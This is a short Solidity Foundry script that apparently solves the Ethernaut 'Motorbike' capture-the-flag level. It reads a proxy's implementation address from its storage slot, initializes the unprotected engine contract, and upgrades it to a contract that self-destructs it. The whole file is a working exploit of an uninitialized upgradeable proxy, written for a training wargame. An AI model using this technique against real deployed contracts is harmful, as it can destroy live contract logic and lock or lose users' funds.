// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Script.sol";
import "../src/interfaces/25_IMotorbike.sol";
import "../src/25_MotorbikeSolution.sol";

address constant INSTANCE = 0xD4aE61b8EE6c07aCE4559a92A63890De9aDdF0F9;

bytes32 constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

contract MotorbikePOCScript is Script {
    function run() external {
        vm.startBroadcast();

        address engine = address(uint160(uint256(vm.load(INSTANCE, _IMPLEMENTATION_SLOT))));

        MotorbikeSolution solution = new MotorbikeSolution();
        IEngine(engine).initialize();
        IEngine(engine).upgradeToAndCall(address(solution), abi.encodeWithSignature("destroy()"));

        vm.stopBroadcast();
    }
}
